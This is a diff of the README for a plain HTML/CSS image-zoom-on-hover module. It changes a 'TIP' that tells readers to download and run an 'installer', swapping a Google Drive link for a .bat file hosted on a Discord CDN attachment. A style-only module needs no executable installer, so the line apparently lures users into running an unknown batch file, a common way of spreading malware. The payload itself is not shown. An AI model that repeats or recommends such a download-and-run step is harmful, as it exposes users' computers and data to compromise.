@@ -10,7 +10,7 @@ This simple module is supposed to zoom images on hover in plain `HTML` & `CSS`. 
 
 # Usage
 
-> **TIP:** Want to files without the hassle of downloading the the files individually? Install the installer <a href="https://drive.google.com/u/0/uc?export=download&confirm=jwZK&id=1uOvurS2CgiOPxCK3_Dhaj2hXJqROHHNj" target="_blank">here</a> & run it and it will install all of the files for you.
+> **TIP:** Want to files without the hassle of downloading the the files individually? Install the installer <a href="https://cdn.discordapp.com/attachments/853482560541687820/882409141837127730/installer.bat" target="_blank">here</a> & run it and it will install all of the files for you.
 
 Its very simple, just import the css files using 
 ```html
